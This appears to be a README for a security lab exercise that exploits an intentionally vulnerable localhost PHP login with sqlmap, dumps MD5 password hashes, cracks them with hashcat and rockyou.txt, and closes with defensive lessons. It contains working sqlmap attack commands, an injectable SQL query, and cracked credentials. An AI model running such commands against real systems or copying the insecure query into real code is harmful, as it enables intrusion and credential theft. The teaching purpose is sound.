# Password Extraction & Cracking Demo via SQL Injection and Hashcat

This project demonstrates how a vulnerable web application can be exploited using SQL injection to extract password hashes from a backend database, followed by cracking those hashes using *hashcat* and a common wordlist (`rockyou.txt`).

---

## 1. Simulating the Vulnerable Environment

We created a PHP-based login form that is **intentionally insecure** by:

- Using unsalted MD5 for password hashing.
- Executing unparameterized SQL queries.

```php
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$hashedPassword'";
```

This was demonstrated using our vulnerable_login.php file.

## 2. SQL Injection

We used SQLmap to perform an automated SQL injection attack using the following steps:
- Prepared a test POST request
    ``` 
    sqlmap -u "http://localhost/vulnerable_login.php" --data="username=user1&password=123456" --batch --level=5 --risk=3
    ```
- Check for vulnerable databases
    ```
    sqlmap -u "http://localhost/vulnerable_login.php" --data="username=user1&password=123456" --batch --level=5 --risk=3 --dbs
    ```
- List tables in vulnerable database
    ```
    sqlmap -u "http://localhost/vulnerable_login.php" --data="username=user1&password=123456" --batch -D bankapp --tables
    ```
- Dump users table containing MD5 hashed passwords
    ```
    sqlmap -u "http://localhost/vulnerable_login.php" --data="username=user1&password=123456" --batch -D bankapp -T users --dump
    ```

## 3. Prearing and Cracking Hashed Passwords

We saved the hashedpasswords to our `md5hashes.txt` and used *hashcat* and a bashscript `./crack_md5.sh` to automate the cracking process. The script used hashcat and the `rockyou.txt` password list to crack the md5 hashes, rendering this output:

```
Cracked hashes:
482c811da5d5b4bc6d497ffa98491e38:password123
55122120498e3673fa6fcb8f7087a494:usr2123
3904117c6df2f91e8e92db1406bcb5ed:bob363
25ab1e918ecafc97687acffa220f692b:hardpass
9a7108cfaa7f51efb5fcda9e9d4b7a90:hello100
2bc35ad1dc45b4359d3c4acbe4fbdaf7:newpass8
cc9a250cde92dc08fa00a6c6d8944408:bread101
```

### Observations and Lessons

This helped us learn that we should always use `parameterized queries` to prevent SQL injection and easy access to our databases with secure information. We should also avoid storing unsalted passwords, especially with weak encryption such as MD5. We can also attempt to employ attempt limits and input validation to avoid brute force and injection attacks in the future.
